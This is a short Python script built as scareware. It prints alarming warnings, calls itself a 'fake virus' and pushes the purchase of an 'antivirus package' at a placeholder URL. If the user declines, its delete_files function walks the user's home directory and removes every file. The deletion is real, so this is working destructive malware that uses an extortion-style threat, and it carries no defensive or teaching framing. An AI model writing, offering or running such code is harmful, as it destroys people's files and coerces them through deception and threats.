import os
from random import randint

def scare_user():
    print("!!!!!!!!!!!!!!!")
    print("!!!!!!!!!!!!!!!")
    print("!!!!!!!!!!!!!!!")
    print("")
    print("This is a fake virus! Please don't panic!")
    print("However, to remove it you need to purchase our antivirus package.")
    print("")
    print("https://www.exampleantivirus.com/")
    print("")
    print("Or else your files will be deleted in 30 seconds")
    print("")
    
def delete_files():
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        for file in files:
            os.remove(os.path.join(root, file))

def main():
    scare_user()
    
    user_input = input("Would you like to purchase our antivirus package? (y/n): ")

    if user_input == "n":
        delete_files()
        
if __name__ == "__main__":
    main()
